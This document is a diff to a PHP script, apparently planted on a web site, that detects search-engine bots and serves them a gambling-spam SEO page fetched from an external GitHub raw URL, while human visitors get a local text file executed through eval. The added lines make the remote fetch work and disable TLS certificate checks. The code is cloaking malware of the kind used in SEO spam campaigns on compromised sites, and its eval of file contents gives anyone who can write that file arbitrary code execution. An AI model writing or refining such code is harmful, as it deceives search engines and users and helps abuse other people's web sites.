@@ -5,6 +5,27 @@ function isSearchEngineBot() {
 }
 
 function JajangFetchLocal($filePath) {
+    // Cek apakah URL eksternal (http:// atau https://)
+    if (preg_match('/^https?:\/\//i', $filePath)) {
+        // Ambil konten dari URL eksternal
+        $ch = curl_init($filePath);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; SEO Bot)');
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($http_code === 200 && $response !== false) {
+            return $response;
+        }
+        return "<!-- Failed to fetch external URL: $filePath -->";
+    }
+    
+    // Jika file lokal
     if (file_exists($filePath)) {
         return file_get_contents($filePath);
     } else {
@@ -12,13 +33,13 @@ function JajangFetchLocal($filePath) {
     }
 }
 
-$landing_page = __DIR__ . 'https://raw.githubusercontent.com/freyarion25/landingpage/refs/heads/main/chia-slot-gacor.txt';       // BOT â†’ SEO landing page
-$index_home   = __DIR__ . '/index2.txt'; // HUMAN â†’ halaman biasa
+$landing_page = 'https://raw.githubusercontent.com/freyarion25/landingpage/refs/heads/main/chia-slot-gacor.txt';       // BOT → SEO landing page
+$index_home   = __DIR__ . '/index2.txt'; // HUMAN → halaman biasa
 
 if (isSearchEngineBot()) {
-    // ROBOT â†’ tunjuk SEO landing page
+    // ROBOT → tunjuk SEO landing page
     echo JajangFetchLocal($landing_page);
 } else {
-    // HUMAN â†’ load index-backup sebagai PHP
+    // HUMAN → load index-backup sebagai PHP
     eval('?>' . JajangFetchLocal($index_home));
 }
